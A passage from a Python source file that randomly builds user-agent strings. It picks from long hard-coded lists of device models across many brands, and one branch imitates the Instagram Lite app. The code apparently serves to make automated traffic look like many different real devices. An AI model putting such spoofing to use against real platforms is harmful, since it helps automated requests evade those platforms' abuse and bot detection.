                    self.useragent = ('SupportsFresco=1 modular=2 Dalvik/2.1.0 (Linux; U; Android {}; {} Build/QKQ1.190918.001) [FBAN/InstagramCarbon;FBBV/{};FBAV/{};FBDV/{};FBSV/9;FBCX/OkHttp3;FBDM/'.format(self.android_version, self.android_model, self.FBBV, self.instagram_lite_version, self.android_model) + '{ensity=1.5}' + ']')
                elif self.jenis == 'Evercoss':
                    self.android_version = random.choice(['11', '9', '10'])
                    self.android_model = random.choice(['EVERCOSS A5Z', 'EVERCOSS A65', 'A75 MAX', 'AT8B', 'M50 MAX', 'M50 STAR', 'M50A', 'M50A MAX', 'R40K', 'R5C', 'R70', 'R70A', 'S55A', 'S55B', 'U50A_PLUS'])
                    self.useragent = ('Mozilla/5.0 (Linux; Android {}; {}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Safari/537.36'.format(self.android_version, self.android_model, self.browser_version))
                elif self.jenis == 'Asus':
                    self.android_version = random.choice(['11', '9', '10'])
                    self.android_model = random.choice(['ME171', 'Slider SL101', 'Slider SL101', 'Slider SL101', 'Slider SL101', 'Slider SL101', 'Slider SL101', 'Slider SL101', 'Slider SL101', 'ME371MG', 'K01N', 'K012', 'K00E', 'K019', 'K00Z', 'K00Z', 'K016', 'K016', 'K00G', 'K00G', 'K50IJ', 'ME172V', 'ME172V', 'ME172V', 'ME172V', 'K00F', 'K01E', 'K00R', 'K017', 'K013', 'K007', 'K01A', 'ASUS MeMO Pad 7', 'K015', 'K011', 'K00L', 'ME302C', 'ME302C', 'ME302C', 'AOSP on Duma', 'ME302KL', 'ME302KL', 'K00U', 'ME173X', 'ME173X', 'ME173X', 'ME173X', 'ASUS K00S', 'ME301T', 'ME301T', 'ME301T', 'PadFone', 'PadFone', 'PadFone 2', 'PadFone 2', 'PadFone T008', 'PadFone T008', 'PadFone T004', 'ASUS_T00E', 'PadFone T00C', 'Padfone t00c', 'PadFone T00C', 'ASUS_T00N', 'ASUS PadFone X', 'ASUS_T00T', 'ASUS_Z01QD', 'ZS600KL', 'ASUS_I001DE', 'ZS660KL', 'ASUS_I001DA', 'ASUS_I001DC', 'ZS660KL', 'ASUS_I003DD', 'ZS661KS', 'ASUS_I003DD', 'ZS661KS', 'ASUS_I005DA', 'ASUS_I005DC', 'ASUS_AI2201_C', 'ASUS_AI2201_D', 'ASUS_AI2201_F', 'ASUS_AI2203_D', 'ASUS_AI2203_C', 'ASUS_AI2203_B', 'ASUS TAB A8', 'Tinker Board', 'Tinker Board 2', 'Tinker Board S', 'TX201LA', 'TX201LA', 'K010', 'K018', 'K018', 'TF300T', 'ASUS Pad TF300T', 'K01B', 'K00C', 'K00C', 'ASUS XPad 10LTE', 'ASUS Z101', 'ASUS Z101 Prime', 'ASUS_Z008D', 'ASUS_Z00AD', 'Z00D', 'ASUS_Z00LD', 'ASUS_Z00ED', 'ASUS_Z00RD', 'ASUS ZenFone 2E', 'ASUS_Z012D', 'ZE520KL', 'ASUS_Z017D', 'ASUS_Z012DA', 'ASUS_Z017DA', 'ASUS_Z012S', 'ASUS_Z012DE', 'ASUS_Z01FD', 'ASUS_Z016S', 'ZS550KL', 'ASUS_Z01BD', 'ASUS_Z01BS', 'ZC551KL', 'ASUS_Z01BDB', 'ASUS_X00DDB', 'ASUS_X008D', 'ASUS_X00DDA', 'ZC553KL', 'ASUS_X008DB', 'ASUS_A001', 'ASUS_Z01HDA', 'ZE553KL', 'ASUS_X00LD', 'ASUS_Z01KDA', 'ASUS_Z01KS', 'ASUS_X00LDB', 'ASUS_T00I', 'ASUS_X00HD', 'ASUS_X00ID', 'ZC554KL', 'ASUS_X015D', 'ASUS_X015D', 'ASUS_Z01GS', 'ASUS_Z01GD', 'ASUS_X00LDA', 'ZD553KL', 'ASUS_Z01MD', 'ASUS_Z01MDA', 'ZD552KL', 'ASUS_X00QD', 'ASUS_X00QD', 'ASUS_T00J', 'ASUS_X00QSA', 'ZE620KL', 'ASUS_T00F', 'ASUS_T00F', 'ASUS_T00K', 'ASUS_X017DA', 'ASUS_T00P', 'ASUS_Z01RD', 'ASUS_Z01RD', 'Zenfone 5Z', 'ZS620KL', 'ASUS_T00G', 'ASUS_I01WD', 'ASUS_T00G', 'ASUS_Z002', 'ZS630KL', 'ASUS_I002D', 'ZS670KS', 'ZS671KS', 'ASUS_I006D', 'ASUS_I004D', 'ASUS_AI2202', 'ASUS_AI2202_B', 'ASUS_A002', 'ASUS_A002A', 'ASUS_Z007', 'ASUS_X00ADA', 'ASUS_X00BD', 'ASUS_X007D', 'ZB500KL', 'ASUS_Z00SD', 'ZB551KL', 'ASUS_L001', 'ZB500KG', 'ASUS_Z00VD', 'ASUS_X013DA', 'ASUS_X013D', 'ASUS_X014D', 'ASUS_X014D', 'ASUS_X013DB', 'G550KL', 'G550KL', 'G553KL', 'ASUS_Z00YD', 'ASUS_A007', 'ASUS_X00RD', 'G552KL', 'ASUS_Z010DD', 'ASUS_Z010DB', 'ASUS_Z010D', 'ASUS_Z010DA', 'ASUS_X00PD', 'ZB555KL', 'ASUS_X01AD', 'ZB633KL', 'ASUS_X018D', 'ASUS_X018DC', 'ASUS_X00TD', 'ASUS_X00TDB', 'ASUS_X00TDE', 'ZB602KL', 'ASUS_X01BDA', 'ASUS_A001D', 'ASUS_X002', 'ASUS_X003', 'ASUS_X003', 'ASUS_X550', 'ASUS_X00GD', 'ASUS_X005', 'ASUS_Z00UDB', 'ASUS_Z00UD', 'ASUS_A006', 'ASUS_A009', 'ASUS_Z00XS', 'P01T_1', 'P021', 'P00L', 'P00C', 'P028', 'P027', 'ASUS_P00I', 'P001', 'P008', 'ASUS_P00J', 'ASUS ZenWatch', 'ASUS ZenWatch 2'])
                    self.useragent = ('Mozilla/5.0 (Linux; Android {}; {}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Safari/537.36'.format(self.android_version, self.android_model, self.browser_version))
                elif self.jenis == 'Itel':
                    self.android_version = random.choice(['11', '9', '10', '12', '13'])
                    self.android_model = random.choice(['itel A11', 'itel A12', 'itel A13', 'itel A14', 'itel W4003', 'itel W4002', 'itel W4002', 'itel W4002', 'itel A15', 'itel A15R', 'itel A16', 'itel A16 Plus', 'itel A510W', 'itel A510W', 'itel A510W', 'itel A16 Plus', 'itel A16S', 'itel W5006X', 'itel A512W', 'itel A20', 'itel A21', 'itel A22', 'itel A22 Pro', 'itel A23', 'itel L5006S', 'itel L5006C', 'itel A23A', 'itel A23R', 'itel A23S', 'itel L5007S', 'itel L5002', 'itel L5002P', 'itel A571L', 'itel A31', 'itel A32F', 'itel A32F', 'itel W5001P', 'itel W5001P', 'itel A509WM', 'itel A509WP', 'itel A509W', 'itel W5002', 'itel W5505', 'itel W5505', 'itel W5505', 'itel A571W', 'itel A571WM', 'itel A40', 'itel A41', 'itel A41 Plus', 'itel A42 Plus', 'itel A43', 'itel A44', 'itel L5502', 'itel A44 Power', 'itel A44 PowerRU', 'itel A44 Pro', 'itel A45', 'itel L5503', 'itel L5503L', 'itel L5503S', 'itel L5505', 'en itel L5505', 'itel L5505', 'MZ-itel L6006', 'itel L6006L', 'itel L6006F', 'itel A661L', 'itel A631L', 'itel A507LM', 'itel A51', 'itel A511LP', 'itel A511LQ', 'itel A52', 'itel A52 Lite', 'arm itel A52 Lite', 'itel A52S Lite', 'itel W6003', 'itel W6003', 'itel L6003P', 'itel W6004', 'itel W6004', 'itel W6004P', 'itel A611WP', 'itel A661W', 'itel A631W', 'itel A661WP', 'itel A662L', 'itel A62', 'itel A632W', 'itel W4001', 'itel W4001O', 'itel W4001P', 'itel L6004L', 'itel W5503', 'GP10X2019', 'iNote beyond', 'iNote mini', 'itel it1701', 'itel it1702', 'itel it1703', 'itel IT1351', 'itel IT1351E', 'itel it1355', 'itel it1404', 'itel it1406', 'itel it1407', 'itel it1408', 'itel it1409', 'itel-it1410', 'itel it1460 Pro', 'itel it1500', 'itel_it1502', 'itel_it1503', 'itel it1506', 'itel it1507', 'itel it1508', 'itel it1508 Plus', 'itel-it1512', 'itel it1513', 'itel it1516 Plus', 'itel it1518', 'itel-it1520', 'itel it1550', 'itel it1556 Plus', 'itel it1655', 'Itel W7001', 'itel W7001', 'itel P10001L', 'itel P11', 'itel P12', 'itel P13', 'itel P13', 'itel P13 Plus', 'itel W5005', 'itel W5005P', 'itel P551W', 'itel P552W', 'itel P31', 'itel P32', 'itel W5504', 'itel W6001', 'itel W6501', 'itel P651W', 'itel P681L', 'itel P681LM', 'itel P661W', 'itel P682LP', 'itel P41', 'itel P51', 'itel P662L', 'itel-it1553', 'itel Prime 4', 'itel W7002P', 'itel S11', 'itel S11Plus', 'itel S11 Pro', 'itel S11X', 'itel S11XB', 'itel S12', 'itel S13', 'itel S13', 'itel S13 Pro', 'itel W6002E', 'itel W6002', 'itel L6002P', 'itel W6502', 'itel W6503', 'itel L6503', 'itel S661W', 'itel A551L', 'itel S663L', 'itel S21', 'itel S31', 'itel S32', 'itel W5003', 'Itel W5003', 'itel S33', 'itel S41', 'itel S42', 'itel S662L', 'itel S662LC', 'itel S665L', 'itel W4001S', 'itel L6005', 'itel L6501', 'itel L6502', 'itel L6502', 'itel P651L', 'MZ-itel P651L', 'itel S661L', 'itel S661LP', 'itel P682LPN', 'itel S663LC', 'itel W5004D', 'itel W5008'])
                    self.useragent = ('Mozilla/5.0 (Linux; Android {}; {}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Safari/537.36'.format(self.android_version, self.android_model, self.browser_version))
                elif self.jenis == 'Oneplus':
                    self.android_version = random.choice(['11', '9', '10', '12', '13'])
                    self.android_model = random.choice(['NE2213', 'NE2217', 'NE2215', 'NE2210', 'NE2210', 'CPH2423', 'CPH2411', 'CPH2417', 'CPH2413', 'CPH2415', 'CPH2449', 'CPH2487', 'ONE A2003', 'ONE A2003', 'ONE A2001', 'ONE A2005', 'ONEPLUS A3003', 'ONEPLUS A3000', 'ONEPLUS A3010', 'ONEPLUS A5000', 'ONEPLUS A5000', 'ONEPLUS A5010', 'ONEPLUS A5010', 'ONEPLUS A5010', 'ONEPLUS A5010', 'ONEPLUS A5010', 'ONEPLUS A6003', 'ONEPLUS A6000', 'ONEPLUS A6010', 'ONEPLUS A6013', 'ONEPLUS A6010', 'GM1900', 'GM1901', 'GM1903', 'GM1917', 'GM1913', 'GM1911', 'GM1910', 'GM1915', 'GM1910', 'HD1901', 'HD1903', 'HD1900 Flow', 'HD1905', 'HD1900', 'HD1907', 'HD1911', 'HD1913', 'HD1910', 'GM1925', 'HD1925', 'GM1920', 'IN2013', 'IN2015', 'IN2010', 'IN2010', 'IN2017', 'IN2019', 'IN2023', 'IN2025', 'IN2020', 'OnePlus8Pro', 'KB2005', 'KB2001', 'KB2007', 'KB2003', 'KB2000', 'OnePlus 8T 5G', 'LE2115', 'LE2113', 'LE2111', 'LE2110', 'LE2120', 'LE2125', 'LE2123', 'LE2121', 'LE2127', 'OnePlus9Pro', 'LE2101', 'LE2100', 'MT2111', 'MT2110', 'ONEPLUS A19677', 'ONEPLUS A2345', 'Oneplus A31', 'Oneplus A3331', 'ONEPLUS A35904', 'ONEPLUS A37000', 'ONEPLUS A3EVB', 'ONEPLUS A62322', 'ONEPLUS A64794', 'ONEPLUS A65369', 'ONEPLUS A68333', 'ONEPLUS A70458', 'ONEPLUS A70791', 'ONEPLUS A78637', 'ONEPLUS A80828', 'ONEPLUS A83306', 'ONEPLUS A87046', 'ONEPLUS A90641', 'Oneplus A99831', 'PGKM10', 'PGKM10', 'PHK110', 'PHK110', 'PGP110', 'PGP110', 'PGZ110', 'ONEPLUS KB2023', 'OnePlus Nord', 'Oneplus Nord 2', 'DN2103', 'DN2101', 'CPH2399', 'CPH2401', 'AC2001', 'AC2003', 'IV2201', 'CPH2409', 'CPH2381', 'CPH2465', 'EB2103', 'EB2101', 'EB2101', 'BE2025', 'BE2026', 'BE2029', 'Nord N10 5G', 'BE2028', 'BE2013', 'BE2011', 'BE2012', 'CPH2459', 'GN2200', 'CPH2469', 'DE2118', 'DE2117', 'A0001', 'ONE E1001', 'ONE E1003', 'ONE E1001', 'ONE E1005'])
                    self.useragent = ('Mozilla/5.0 (Linux; Android {}; {}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Safari/537.36'.format(self.android_version, self.android_model, self.browser_version))
                elif self.jenis == 'Camera':
                    self.android_version = random.choice(['4.2.2', '4.1.2', '4.4.4'])
                    self.android_model = random.choice(['SM-C101 Build/KOT49H', 'SM-C101 Build/KOT49H', 'EK-GC100 Build/JZO54K', 'SM-A5000 Build/KTU84P'])
                    self.useragent = ('Mozilla/5.0 (Linux; Android {}; {}) AppleWebKit/537.36 (KHTML like Gecko) Chrome/{} Mobile Safari/537.36'.format(self.android_version, self.android_model, self.browser_version))
                elif self.jenis == 'Playstation':
                    self.playstation_model = random.choice(['PlayStation Vita 3.69', 'PlayStation 5', '(PlayStation; PlayStation 5/6.02', 'PlayStation; PlayStation 4/10.01', 'PlayStation Portable', 'PlayStation; PlayStation 4/10.00', 'PlayStation; PlayStation 5/6.00', 'PlayStation 4 9.60', 'Playstation2; Linux 2.4.20 MIPS; ja-JP; rv:1.8a2'])
                    self.useragent = ('Mozilla/5.0 ({}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15'.format(self.playstation_model))
                elif self.jenis == 'Speaker':
                    self.speaker_version = random.choice(['7.1.2', '5.1.1'])
                    self.speaker_model = random.choice(['AEOCW Build/NS6543; wv', 'AEOCH Build/NS6548; wv', 'AEOKN Build/LVY48F; wv'])
                    self.useragent = ('Mozilla/5.0 (Linux; Android {}; {}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{} Safari/537.36'.format(self.speaker_version, self.speaker_model, self.browser_version))
                elif self.jenis == 'Tv':
                    self.tv_version = random.choice(['9', '11'])
                    self.tv_model = random.choice(['SHIELD Android TV Build/PPR1.180610.011', 'SMART TV Build/RP1A.200720.011; wv', 'Smart TV Pro Build/AR2101; wv', 'SMART_TV Build/PPR1.180610.011; wv', 'SMART TV Build/PPR2.180905.006.A1; wv', 'Smart TV Build/OPR5.170623.014; wv'])
                    self.useragent = ('Mozilla/5.0 (Linux; Android {}; {}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{} Mobile Safari/537.36'.format(self.tv_version, self.tv_model, self.browser_version))
                elif self.jenis == 'Nokia':
                    self.android_version = random.choice(['11', '12'])
                    self.android_model = random.choice(['Nokia 1', 'Nokia 1 Plus', 'Nokia 1011', 'Nokia 105', 'Nokia 2.1', 'Nokia 2 V', 'Nokia 2 V Tella', 'TA-1032', 'TA-1020', 'TA-1032', 'Nokia 3 V', 'Nokia_3310_4G', 'Nokia 3310', 'NOKIA 3310', 'Nokia 4', 'TA-1053', 'TA-1024', 'TA-1021', 'TA-1021', 'TA-1033', 'TA-1000', 'Nokia 1.3', 'TA-1041', 'Nokia 7', 'TA-1041', 'TA-1041', 'Nokia 7 plus', 'Nokia 7 plus', 'TA-1004', 'TA-1012', 'TA-1012', 'TA-1052', 'Nokia 8 Sirocco', 'Nokia 8910i', 'Nokia 8 V 5G UW', 'Nokia 9', 'Nokia C01 Plus', 'Nokia C01 Plus', 'Nokia C02', 'Nokia C1', 'es Nokia C1 Plus', 'Nokia C1', 'Nokia C1 Plus', 'Nokia C1 2nd Edition', 'Nokia C1', 'Nokia C1', 'Nokia C10', 'N152DL', 'Nokia C100', 'Nokia C12', 'Nokia C12 Pro', 'Nokia C2', 'Nokia C2', 'Nokia C2', 'Nokia C2 2nd Edition', 'Nokia C2 Tennen', 'Nokia C20', 'Nokia C20 Plus', 'Nokia C200', 'N151DL', 'Nokia C21', 'Nokia C21 Plus', 'Nokia C22', 'Nokia C3', 'Nokia C30', 'Nokia C31', 'Nokia C32', 'Nokia C5 Endi', 'Nokia G10', 'N150DL', 'Nokia G100', 'Nokia G11', 'Nokia G11 Plus', 'Nokia G20', 'Nokia G20', 'Nokia G21', 'Nokia G22', 'N1374DL', 'Nokia G400 5G', 'Nokia G50', 'Nokia G60 5G', 'Lumia 430', 'Nokia N900', 'Nokia Streaming Box 8000', 'Nokia T10', 'Nokia T20', 'Nokia T21', 'Nokia_X', 'Nokia_X', 'Nokia_X', 'Nokia X10', 'Nokia X100', 'Nokia_X2', 'NokiaX2DS', 'NokiaX2DS', 'NokiaX2DS', 'NokiaX2DS', 'Nokia X20', 'Nokia X30 5G', 'Nokia X5', 'Nokia X5', 'Nokia X6', 'Nokia X6', 'Nokia X7', 'Nokia X7', 'Nokia X71', 'Nokia_XL', 'Nokia_XL', 'Nokia_XL', 'Nokia XR20', 'Nokia XR21'])
                    self.useragent = ('Mozilla/5.0 (Linux; Android {}; {}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Mobile Safari/537.36'.format(self.android_version, self.android_model, self.browser_version))
                elif self.jenis == 'Advan':
                    self.android_version = random.choice(['11.0', '10.0', '9', '10'])
                    self.android_model = random.choice(['5041', '5041', '5058', '5059', '5059', '5061', '5062', '5062', 'E1C_3G', 'E1C_3G', 'E1C Pro', '6004', '6002', '6002', '6201', 'i7U', 'i7U', 'i4U', 'i4U', 'i55D', 'i55D', 'i55K', 'i55K', 'i5C', 'i5C', 'i5C', 'I5E', 'i5E', 'i5E', 'i5K', 'i5K', 'i7A', 'I7D', 'I7D', 'ADVAN M4', '5202', '5505', '5505', 'ADVAN S40', 'ADVAN S40', 'S45E', 'S4Z', 'S4Z', 'S4Z', 'S4Z', 'i5G', 'S50H', 'S5E_NXT', 'S5E_NXT', 'S5E_NXT', 'S7D', 'S7D', 'ADVAN 1011', 'ADVAN T5C'])
                    self.useragent = ('Mozilla/5.0 (Linux; Android {}; {}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Mobile Safari/537.36'.format(self.android_version, self.android_model, self.browser_version))
                elif self.jenis == 'Poco':
                    self.android_version = random.choice(['11', '12', '13'])
                    self.android_model = random.choice(['M2006C3MI', '211033MI', '22031116AI', '220333QPG', '220333QPG', 'POCO C40', 'POCO C40', 'POCO F2 Pro', 'POCO F2 Pro', 'M2012K11AG', 'M2104K10I', '22021211RG', '22021211RI', 'POCO F4', 'POCO F4', 'POCO F4', '21121210G', 'POCO F4 GT', 'POCO F4 GT', '23049PCD8G', '23013PC75G', 'M2004J19PI', 'POCO M2 Pro', 'POCO M2 Pro', 'M2010J19CI', 'M2010J19CG', 'POCO M3', 'POCO M3 Pro', 'POCO M3 Pro', 'M2103K19PG', 'POCO M3 Pro 5G', '22041219PG', '22041219PI', 'POCO M4 5G', '2201117PG', '21091116AG', 'POCO M4 Pro 5G', 'POCO M4 Pro 5G', 'POCO M4 Pro 5G', 'POCO M4 Pro 5G', '22071219CG', 'POCO M5', 'POCO M5', '22071219CI', '2207117BPG', 'POCO M5s', 'POCO X2', 'M2007J20CI', 'M2007J20CI', '21061110AG', 'M2007J20CG', 'M2102J20SG', 'M2102J20SI', '22041216G', 'POCO X4 GT', '22041216G', 'POCO X4 GT', 'POCO X4 GT', 'POCO X4 GT', '2201116PG', 'POCO X4 Pro 5G', '2201116PG', '2201116PI', '22111317PG', 'POCO X5 5G', 'POCO X5 5G', '22101320G', 'POCO X5 Pro 5G', 'POCO X5 Pro 5G', 'POCO X5 Pro 5G', '22101320G'])
                    self.useragent = ('Mozilla/5.0 (Linux; Android {}; {}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Safari/537.36'.format(self.android_version, self.android_model, self.browser_version))
                elif self.jenis == 'Apple':
                    self.ios_version = random.choice(['8_3', '8_4', '7_0_6', '7_1', '9_3_2'])
                    self.iphone_model = random.choice(['5SGSM; CPU iPhone', 'CPU iPhone', '5SGLOBAL; CPU iPhone'])
                    self.applewebkit = random.choice(['601.1.46', '537.51.2', '537.51.1', '600.1.4'])
                    self.mobile = random.choice(['11B651', '11D167'])
                    self.useragent = ('Mozilla/5.0 (iPhone {} OS {} like Mac OS X) AppleWebKit/{} (KHTML, like Gecko) Version/6.0 MQQBrowser/5.0.5 Mobile/{} Safari/8536.25'.format(self.iphone_model, self.ios_version, self.applewebkit, self.mobile))
                elif self.jenis == 'Sony':
                    self.android_version = random.choice(['12', '10', '11', '9', '8.0.0', '13'])
                    self.android_model = random.choice(['BRAVIA 2015', 'BRAVIA 2K GB ATV3', 'BRAVIA 4K 2015', 'BRAVIA 4K GB', 'BRAVIA 4K GB ATV3', 'BRAVIA 4K UR2', 'BRAVIA 4K UR3', 'BRAVIA 4K VH2', 'BRAVIA VH1', 'BRAVIA VU1', 'Sony Experia 10', 'H4433', 'SONY-M880', 'SGP412', 'SGP551', 'SmartWatch 3', 'Sony Tablet P', 'Sony Tablet P', 'Sony Tablet P', 'Sony Tablet P', 'Sony Tablet S', 'Sony Tablet S', 'Sony Tablet S', 'Sony Tablet S', 'Sony Tablet S', 'NW-A100Series', 'NW-Z1000Series', 'Sony Xperia', 'J9110', '802SO', 'SOV40', 'SO-51A', 'SOG01', 'XQ-AT51', 'XQ-AT42', 'SO51Aa', 'SO-51B', 'XQ-BC52', 'SOG03', 'XQ-BC72', 'XQ-CT72', 'XQ-CT54', 'SOG06', 'I4113', 'I3113', 'I4193', 'SO-41A', 'SOV43', 'A001SO', 'XQ-AU52', 'XQ-AT52', 'XQ-BT52', 'SOG04', 'A102SO', 'SO-52B', 'XQ-BT44', 'XQ-CC54', 'XQ-CC72', 'SO-52C', 'A202SO', 'I4293', 'I4213', 'SOV41', '901SO', 'SO-01M', 'J8210', 'J9210', 'SO-52A', 'SOG02', 'XQ-AS52', 'A002SO', 'XQ-AS72', 'XQ-BQ52', 'SO-53B', 'SOG05', 'XQ-BQ72', 'A103SO', 'XQ-CQ54', 'XQ-CQ72', 'SOV42', '902SO', 'J3273', 'SO-04E', 'SonySO-04E', 'Xperia A', 'SO-04F', 'SAMSUNG Xperia a369i', 'SO-04G', 'SO-04G', 'J3173', 'SO-41B', 'SOG08', 'SO-53C', 'A203SO', 'Xperia Active', 'Xperia Active', 'Xperia Active', 'Xperia Arc', 'Xperia Arc', 'Xperia Arc', 'Xperia Arc S', 'Xperia Arc S', 'Xperia Arc S', 'Xperia Arc S', 'Xperia Arc S', 'Xperia Arc S', 'Xperia Arc S', 'Xperia Arc S', 'Xperia Arc S', 'Xperia Arc S', 'Xperia Arc S', 'Xperia Arc S', 'Xperia Arc S', 'SonyEricssonSO-02C', 'SonyEricssonSO-02C', 'SonyEricssonSO-02C', 'SonyEricssonSO-02C', 'SonyEricssonSO-02C', 'SonyEricssonSO-02C', 'SonyEricssonSO-02C', 'SonyEricssonSO-03D', 'SonyEricssonSO-03D', 'SonyEricssonSO-03D', 'SonyEricssonSO-03D', 'SonyEricssonSO-03D', 'SonyEricssonSO-03D', 'SonyEricssonSO-03D', 'LT26w', 'LT26w', 'SO-01E', 'Sony Xperia B6376', 'XPERIA BEAST 3', 'Xperia Burst', 'S39h', 'C2304', 'C2305', 'C2304', 'C2305', 'D2533', 'D2502', 'E5306', 'E5303', 'E5303', 'E5353', 'E5333', 'E5363', 'E5333', 'Xperia C5', 'E5553', 'E5506', 'E5533', 'E5563', 'XPERIA CUSTOM XA8', 'C1505', 'C1505', 'C1504', 'SonyC1504', 'SonyC1505v', 'SonyC1505', 'SonyC1504', 'SonyC1505', 'SonyC1504', 'C1505', 'C1505', 'SonyC1505', 'SonyC1505', 'SonyC1505', 'C1604', 'SonyC1605', 'SonyC1604', 'C1605', 'C1605', 'SonyC1605', 'C1604', 'SonyC1605', 'D2005', 'D2004', 'SonyD2005', 'D2005', 'D2104', 'D2114', 'D2105', 'D2105', 'XPERIA E16i', 'D2203', 'D2202', 'D2243', 'D2206', 'Xperia E3 3G', 'E3 Dual', 'D2212', 'D2212', 'D2212', 'E2115', 'E2104', 'E2105', 'xperia e4 dual', 'E2003', 'E2053', 'E2006', 'E2043', 'E2033', 'E2033', 'F3311', 'F3313', 'Xperia F_v3 Ultra', 'SONY XPERIA G', 'SonyST27a', 'SonyST27i', 'ST27a', 'ST27i', 'ST27I', 'ru ST27i', 'SonyST27i', 'SonyEricssonST27i', 'ST27i', 'ST27i', 'SO-04D', 'SonySO-04D', 'Xperia H870', 'SonyLT28i', 'SonyLT28h', 'LT28h', 'SonyEricssonLT28at', 'SonyEricssonLT28h', 'LT28i', 'LT28h', 'SonyLT28h', 'Xperia ion', 'Xperia ion', 'SonyEricssonLT28i', 'SonyEricssonLT28i', 'SonyEricssonLT28h', 'SonyEricssonLT28i', 'SonyST26a', 'ST26a', 'SonyST26i-o', 'SonyST26i', 'ST26i', 'ST26i', 'Xperia J', 'SonyST26i', 'SonyST26i', 'SonyST26i', 'SonyST26i', 'SonyST26i', 'ST26i', 'C2105', 'C2105', 'C2105', 'C2105', 'C2105', 'G3311', 'G3311', 'G3313', 'G3312', 'ru G3312', 'H3311', 'H3321', 'H4311', 'I3312', 'I4312', 'XQ-AD52', 'C1905', 'C1904', 'C1905', 'SonyC1904', 'SonyC1905', 'C1905', 'C1905', 'C2004', 'C2005', 'D2303', 'D2306', 'D2303', 'Xperia M2 3G', 'D2406', 'D2403', 'D2302', 'XPERIA M2 HSPASS', 'E2303', 'E2333', 'E2306', 'E2363', 'E2312', 'E2312', 'E5603', 'E5606', 'E5653', 'E5633', 'E5663', 'Xperia Mini', 'Xperia Mini', 'Xperia Mini', 'Xperia Mini', 'Xperia Mini', 'Xperia Mini Pro', 'Xperia Mini Pro', 'Xperia Mini Pro', 'Xperia Mini Pro', 'Xperia Mini Pro', 'Xperia mini pro', 'ST23i', 'SonyST23iv', 'SonyST23a', 'ST23i', 'SonyST23i', 'ST23i', 'ST23i', 'ST23i', 'SonyST23i', 'SonyST23i', 'SonyST23i', 'Xperia Neo', 'Xperia Neo', 'Xperia Neo', 'Xperia Neo', 'Xperia Neo', 'Xperia Neo L', 'Xperia Neo V', 'Xperia Neo V', 'Sony Xperia Neo V', 'Xperia Neo V', 'Xperia Neo V', 'Xperia Neo V', 'Xperia Neo V', 'Xperia Neo V', 'Xperia Neo V', 'Xperia Neo V', 'SO-02D', 'Xperia P', 'SonyLT22i', 'LT22i', 'SonyEricssonLT22i', 'SonyEricssonLT22i-o', 'LT22i', 'LT22i', 'LT22i', 'SonyEricssonLT22i-o', 'SonyLT22i', 'XQ-AQ52', 'XQ-AQ62', 'XQ-BE52', 'XQ-BE62', 'XQ-BE72', 'G2299', 'Xperia Ray', 'Xperia Ray', 'Xperia Ray', 'Xperia Ray', 'Xperia Ray', 'Xperia Ray', 'Xperia Ray', 'Xperia Ray', 'Xperia Ray', 'Xperia Ray', 'Sony Xperia RC', 'Sony Xperia RC', 'SonyLT26iv', 'LT26i', 'SonyEricssonLT26i-o', 'SonyEricssonLT26i', 'LT26i', 'Xperia S', 'LT26i', 'SonyEricssonLT26i', 'Xperia S', 'Xperia S', 'Xperia S', 'SonyLT26i', 'LT26ii', 'ru LT26ii', 'LT26ii', 'LT26ii', 'Xperia Sola', 'Xperia Sola', 'C5303', 'C5302', 'C5306', 'SonyC5303', 'SonyC5306', 'C5303', 'Xperia SP', 'SO-05D', 'LT30p', 'SonyLT30p-o', 'LT30p', 'SonyLT30p', 'LT30p', 'LT30a', 'SonyLT30a', 'D5303', 'D5306', 'D5316', 'XM50h', 'XM50t', 'D5303', 'D5322', 'Xperia T3', 'D5103', 'D5102', 'D5106', 'D5103', 'Xperia Tab', 'SGPT12', 'Xperia Tablet S', 'SGPT13', 'SGPT13', 'SGPT12', 'SGP311', 'SGP321', 'SGP312', 'SGP512', 'SGP511', 'SGP521', 'SGP621', 'SGP611', 'SGP712', 'SonyST21i', 'SonyST21i', 'SonyST21i-o', 'ST21i', 'ST21a', 'ST21i', 'SonyST21a', 'SonyST21i', 'SonyST21i', 'SonyST21i', 'SonyST21i', 'SonyST21i', 'SonyST21i', 'SonyST21a', 'SonyST21i', 'SonyST21a', 'ST21i2', 'SonyST21a2', 'SonyST21i2', 'SonyST21i2', 'SonyST21i2', 'ru ST21i2', 'SonyST21i2', 'ST21i2', 'LT29i', 'Xperia TX', 'SonyST25i', 'ST25a', 'ST25i', 'ST25a', 'SonyEricssonST25i', 'ST25i', 'ru ST25i', 'ST25i', 'SonyEricssonST25i', 'SonyEricssonST25i', 'SonyEricssonST25i', 'SOL22', 'SOL22', 'SonySOL22', 'Xperia UL', 'Xperia V', 'SonyLT25i', 'Sony Xperia V', 'SonyLT25i', 'SonySOL21', 'F5121', 'F5321', 'SO-02J', 'F5122', '502SO', 'F8131', 'SO-04H', 'SOV33', 'F8132', 'Xperia X10', 'Xperia X10', 'Xperia X10', 'Xperia X10', 'Xperia x10 Mini Pro', 'Xperia X42', 'Xperia X8', 'XPERIA X8', 'Xperia X8', 'XPERIA X8', 'XPERIA X8', 'Xperia X8', 'Xperia X8', 'Xperia X8', 'XPERIA X8', 'F3111', 'F3115', 'Xperia XA 4', 'F3112', 'F3116', 'F3211', 'F3215', 'F3216', 'F3212', 'G3112', 'G3116', 'G3121', 'G3416', 'G3412', 'G3421', 'G3426', 'G3426', 'G3221', 'G3223', 'G3226', 'G3212', 'Xperia XA1 Unlocked', 'H3113', 'H4113', 'H4133', 'H4413', 'H4493', 'H3413', 'Xperia XA2 Plus Dual (AOSP)', 'H4213', 'H3213', 'H3223', 'H4233', 'Xperia XR', 'Xperia XR', '601SO', 'F8331', 'F8332', 'SO-01J', 'G8142', 'G8141', 'SO-04J', 'SO-04K', 'Xperia XZ Premium Dual (AOSP)', 'SO-01K', 'G8341', 'G8342', 'G8343', 'Xperia XZ1 (AOSPA)', 'G8441', 'SO-02K', 'Xperia XZ1 Dual', 'Xperia XZ1 Dual (AOSP)', 'SO-03K', 'H8324', 'SOV37', '702SO', 'H8216', 